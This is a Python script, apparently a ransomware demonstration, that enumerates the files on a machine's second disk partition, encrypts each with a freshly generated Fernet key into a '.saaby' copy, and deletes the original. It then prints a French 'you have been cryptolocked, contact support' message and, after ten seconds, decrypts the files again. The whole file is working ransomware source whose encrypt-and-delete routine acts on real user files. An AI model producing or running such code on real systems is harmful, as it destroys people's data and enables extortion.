import os
import psutil
import re
from cryptography.fernet import Fernet
import time

def cryptolock():
    message = """
                               
    Vous avez été cryptolocké !
    Contactez le support pour obtenir de l'aide.
    
    """
    return message

def disk_list():

    disks = []
    for partition in psutil.disk_partitions():
        match = (re.search(r"'(.*?)'", str(partition)))
        if match:
            disks.append(match.group(1))

    entry_list = []
    path = disks[1] 
    obj = os.scandir(path)
    for entry in obj :
        if entry.is_dir() or entry.is_file():
            entry_list.append(entry.name)
    obj.close()

    return entry_list, disks

entry_list, disks = disk_list()

files_list = []
for i in range(2, len(entry_list)) : 
    file =  (''.join(disks[1] + entry_list[i]))
    file = file.replace('\\\\', '\\')
    files_list.append(file)

key = Fernet.generate_key()
with open('filekey.key', 'wb') as filekey:   
        filekey.write(key)

with open('filekey.key', 'rb') as filekey:   
        key = filekey.read()
fernet = Fernet(key)      

def encryption(file_to_encrypted):
    
    with open(file_to_encrypted, 'rb') as file: 
        original = file.read()
    encrypted = fernet.encrypt(original)

    with open(file_to_encrypted + ".saaby", 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    os.remove(file_to_encrypted)

    return original

for i in range(0, len(files_list)) : 
    output = encryption(files_list[i])

print(cryptolock())

time.sleep(10)

def decryption(file_to_decrypted):

    with open(file_to_decrypted+".saaby", 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)

    with open(file_to_decrypted, 'wb') as dec_file:
        dec_file.write(decrypted)
    os.remove(file_to_decrypted+".saaby")

    return decrypted

for i in range(0, len(files_list)) : 
    output = decryption(files_list[i])

